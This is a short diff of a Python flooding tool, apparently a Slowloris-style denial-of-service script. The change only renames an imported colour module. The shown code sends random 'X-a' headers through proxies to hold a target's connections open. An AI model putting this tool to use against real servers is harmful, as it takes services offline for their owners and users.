@@ -4,7 +4,7 @@ import random
 import socket
 from typing import Dict
 
-from colorama import Fore
+from colorama import Fore as F
 
 
 def flood(sock: socket.SocketType, proxy: Dict[str, str]) -> None:
@@ -20,8 +20,10 @@ def flood(sock: socket.SocketType, proxy: Dict[str, str]) -> None:
     laddr, port = sock.getsockname()
     random_header = random.randint(1, 5000)
     sock.send(f"X-a: {random_header}".encode("utf-8"))
-    proxy_addr = f"{Fore.RESET}|{Fore.RESET} Proxy: {Fore.BLUE}{proxy['addr'] + ':' + proxy['port']:>21} "
-    header_sent = f"{Fore.RESET} Header Sent:{Fore.BLUE} X-a {random_header:>4}"
+    proxy_addr = (
+        f"{F.RESET}|{F.RESET} Proxy: {F.BLUE}{proxy['addr'] + ':' + proxy['port']:>21} "
+    )
+    header_sent = f"{F.RESET} Header Sent:{F.BLUE} X-a {random_header:>4}"
     print(
-        f"{Fore.RESET} --> Socket: {Fore.BLUE}{laddr}:{port} {proxy_addr}{Fore.RESET}|{header_sent} {Fore.RESET}"
+        f"{F.RESET} --> Socket: {F.BLUE}{laddr}:{port} {proxy_addr}{F.RESET}|{header_sent} {F.RESET}"
     )
